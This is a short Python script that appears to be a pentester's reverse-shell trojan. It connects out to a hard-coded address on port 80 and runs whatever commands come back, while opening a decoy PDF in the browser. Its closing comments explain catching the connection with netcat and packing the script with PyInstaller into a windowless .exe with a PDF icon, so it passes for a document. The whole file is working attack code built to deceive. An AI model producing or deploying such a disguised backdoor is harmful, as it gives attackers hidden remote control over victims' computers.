#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket, os


# Open a PDF file while open the shell to the pentester
os.popen('explorer https://nic.br/media/docs/publicacoes/13/fasciculo-codigos-maliciosos.pdf')

ip = "192.168.0.111" # change to your ip address
porta = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, porta))

while True:
  cmd = s.recv(1024)
  for comando in os.popen(cmd):
    s.send(comando)


# Open a port in the pentester machine
# nc -vnlp 80
# When the machine connect we will have the non-interactive shell to work with.

# Convert to .exe
# cd c:\Python27\Scripts
# pip2.7.exe install pyinstaller
# Get the pdf.ico from the internet
# pyinstaller.exe ..\simpleshell.py --onefile --windowed --icon=pdf.ico # single file and do not open a window and attache the pdf.ico

